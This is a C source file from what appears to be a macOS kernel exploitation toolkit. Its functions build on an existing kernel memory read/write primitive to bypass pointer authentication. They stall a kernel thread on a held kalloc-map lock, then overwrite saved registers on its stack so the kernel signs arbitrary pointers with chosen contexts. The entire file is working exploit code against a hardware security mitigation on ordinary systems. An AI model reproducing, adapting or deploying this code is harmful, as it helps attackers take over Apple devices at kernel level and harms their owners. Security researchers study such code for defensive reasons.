//
//  util_pacda.c
//  xe
//
//  Created by admin on 12/3/21.
//

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include "xnu/proc.h"
#include "xnu/thread.h"
#include "util/pacda.h"
#include "util/ptrauth.h"
#include "util/lck_rw.h"
#include "util/dispatch.h"
#include "memory/kmem.h"
#include "slider/kernel.h"
#include "util/assert.h"
#include "util/log.h"
#include "util/misc.h"
#include "util/asm.h"
#include "iokit/os_dictionary.h"
#include "iokit/io_surface.h"

#include <macos/macos.h>

#define LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET 0x24c

#define KALLOC_MAP_SWITCH_CAPACITY (XE_PAGE_SIZE * 3 / 16)
#define KERNEL_MAP_SWITCH_CAPACITY (XE_PAGE_SIZE * 64 / 16)


IOSurfaceRef xe_util_pacda_iosurface_create(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    IOSurfaceRef surface = IOSurfaceCreate(props);
    xe_assert(surface != NULL);
    
    CFRelease(alloc_size_cfnum);
    CFRelease(props);
    return surface;
}

void xe_util_pacda_io_surface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorDefault, count, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    for (size_t i=0; i<count; i++) {
        char name[NAME_MAX];
        snprintf(name, sizeof(name), "key_%lu", i + idx_start);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
        CFDictionarySetValue(dict, key, kCFBooleanTrue);
        CFRelease(key);
    }
    IOSurfaceSetValues(surface, dict);
    CFRelease(dict);
}

// faster way to increase surface props dict capacity to KERNEL_MAP_SWITCH_CAPACITY
// than increasing capacity by adding values using IOSurfaceAddValues
void xe_util_pacda_prepare_surface_for_switch(IOSurfaceRef surface_ref, uintptr_t surface) {
    uint32_t new_capacity = KALLOC_MAP_SWITCH_CAPACITY;
    uintptr_t dict = xe_kmem_read_ptr(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
    uint32_t current_capacity = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
    uint32_t current_count = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    xe_assert_cond(new_capacity, >, current_capacity);
    xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_INCREMENT_OFFSET, new_capacity);
    xe_assert_cond(current_count, <=, current_capacity);
    int diff = current_capacity - current_count + 1;
    xe_util_pacda_io_surface_add_values(surface_ref, current_count, diff);
    
    current_capacity = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
    xe_assert_cond(current_capacity, ==, new_capacity);
    current_count = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    xe_assert_cond(current_count, <=, current_capacity);
    
    diff = current_capacity - current_count;
    xe_util_pacda_io_surface_add_values(surface_ref, current_count, diff);
    uint32_t updated_capacity = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_OFFSET);
    uint32_t updated_count = xe_kmem_read_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET);
    xe_assert_cond(current_capacity, ==, updated_capacity);
    xe_assert_cond(updated_count, ==, updated_capacity);
    xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_CAPACITY_INCREMENT_OFFSET, KERNEL_MAP_SWITCH_CAPACITY);
}

void xe_util_pacda_io_surface_destroy(IOSurfaceRef surface) {
    IOSurfaceDecrementUseCount(surface);
}

uintptr_t xe_util_pacda_find_ptr(uintptr_t base, char* data, size_t data_size, uintptr_t ptr, uintptr_t mask) {
    uintptr_t* values = (uintptr_t*)data;
    size_t count = data_size / sizeof(uintptr_t);
    
    for (size_t i=0; i<count; i++) {
        if ((values[i] | mask) == ptr) {
            return base + i * sizeof(uintptr_t);
        }
    }
    
    return 0;
}

uintptr_t xe_util_pacda_get_kstack_ptr(uintptr_t thread) {
    uintptr_t machine = thread + TYPE_THREAD_MEM_MACHINE_OFFSET;
    uintptr_t kstackptr = xe_kmem_read_uint64(machine, TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
    return kstackptr;
}

int xe_util_pacda_sign(uintptr_t ptr, uint64_t ctx, uintptr_t *out) {
    uintptr_t lr_kfree = xe_slider_kernel_slide(FUNC_OS_DICTIONARY_ENSURE_CAPACITY_ADDR) + LR_OS_DICT_ENSURE_CAPACITY_KFREE_OFFSET;
    xe_assert_cond(xe_kmem_read_uint32(lr_kfree - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_KFREE_TYPE_VAR_IMPL_INTERNAL_ADDR), lr_kfree - 4))
    
    xe_log_debug("signing pointer %p with context %p", (void*)ptr, (void*)ctx);
    
    uintptr_t kheap_default = xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kalloc_map = xe_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
    uintptr_t kalloc_map_lck = kalloc_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET;
    
    char* stack = NULL;
    xe_util_lck_rw_t util_lck_rw = NULL;
    
    uintptr_t surface;
    IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
    xe_util_pacda_prepare_surface_for_switch(surface_ref, surface);
    
    util_lck_rw = xe_util_lck_rw_lock_exclusive(kalloc_map_lck);
    
    uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
    dispatch_semaphore_t sem_add_value_start = dispatch_semaphore_create(0);
    dispatch_semaphore_t sem_add_value_complete = dispatch_semaphore_create(0);
    dispatch_async(xe_dispatch_queue(), ^() {
        *waiting_thread = xe_xnu_thread_current_thread();
        dispatch_semaphore_signal(sem_add_value_start);
        xe_util_pacda_io_surface_add_values(surface_ref, KERNEL_MAP_SWITCH_CAPACITY, 1);
        dispatch_semaphore_signal(sem_add_value_complete);
    });
    
    dispatch_semaphore_wait(sem_add_value_start, DISPATCH_TIME_FOREVER);
    dispatch_release(sem_add_value_start);
    
    uintptr_t lr_lck_rw_excl_gen_stack_ptr;
    int error = xe_util_lck_rw_wait_for_contention(util_lck_rw, *waiting_thread, 0, &lr_lck_rw_excl_gen_stack_ptr);
    xe_assert_err(error);
    
    uintptr_t lr_kfree_stack_ptr;
    error = xe_xnu_thread_scan_stack(*waiting_thread, lr_kfree, XE_PTRAUTH_MASK, 1024, &lr_kfree_stack_ptr);
    xe_assert_err(error);
    
    uintptr_t x19 = lr_kfree_stack_ptr - 0x10; // dict
    uintptr_t x20 = x19 - 0x8; // pacda ptr
    uintptr_t x21 = x20 - 0x8; // dict capacity
    uintptr_t x23 = lr_lck_rw_excl_gen_stack_ptr - 0x30; // pacda ctx

    uintptr_t dict = xe_kmem_read_uint64(x19, 0);
    xe_kmem_write_uint64(x23, 0, ctx);
    xe_kmem_write_uint64(x21, 0, ptr);
    /// set the new capacity of dict as 0 so that the newly signed pointer will not be used
    xe_kmem_write_uint64(x20, 0, 0);
    
    xe_util_lck_rw_lock_done(&util_lck_rw);
    dispatch_semaphore_wait(sem_add_value_complete, DISPATCH_TIME_FOREVER);
    dispatch_release(sem_add_value_complete);
    
    uintptr_t signed_ptr = xe_kmem_read_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET);
    
    xe_kmem_write_uint64(dict, TYPE_OS_DICTIONARY_MEM_DICT_ENTRY_OFFSET, 0);
    xe_kmem_write_uint32(dict, TYPE_OS_DICTIONARY_MEM_COUNT_OFFSET, 0);
    
    *out = signed_ptr;
    
    xe_log_debug("signed ptr %p, result: %p", (void*)ptr, (void*)signed_ptr);
exit:
    if (util_lck_rw) {
        xe_util_lck_rw_lock_done(&util_lck_rw);
    }
    if (surface_ref) {
        xe_util_pacda_io_surface_destroy(surface_ref);
    }
    if (stack) {
        free(stack);
    }
    
    return error;
}
